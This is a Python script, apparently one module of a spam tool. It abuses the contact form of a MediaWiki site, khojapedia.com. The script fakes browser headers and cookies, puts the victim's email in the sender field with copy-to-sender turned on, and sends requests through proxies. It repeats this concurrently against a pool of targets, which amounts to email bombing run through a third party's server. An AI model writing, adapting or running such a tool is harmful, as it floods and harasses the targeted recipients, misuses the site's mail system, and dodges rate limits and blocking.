from os.path import basename

import requests

from module import Spam

cookies = {
    '_ga': 'GA1.2.2122375571.1676380149',
    '_gid': 'GA1.2.1597948994.1676380149',
    '_gat': '1',
}

headers = {
    'authority': 'khojapedia.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'origin': 'https://khojapedia.com',
    'referer': 'https://khojapedia.com/wiki/index.php?title=Special:Contact',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = {
            'wpFromName': self.get_text(),
            'wpFromAddress': target,
            'wpSubject': self.get_text(),
            'wpText': self.get_text(),
            'wpCCme': '1',
            'wpEditToken': '+\\',
            'title': 'Special:Contact',
            'wpFormType': '',
        }

        response = requests.post(
            'https://khojapedia.com/wiki/index.php?title=Special:Contact',
            cookies=cookies,
            headers=headers,
            data=data, proxies=self.get_proxies()
        )
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), 'Email sent', target_pool_name='pobcasn23')
    res = spam.send_post()
    if res:
        spam.run_concurrently(60)


if __name__ == '__main__':
    main()
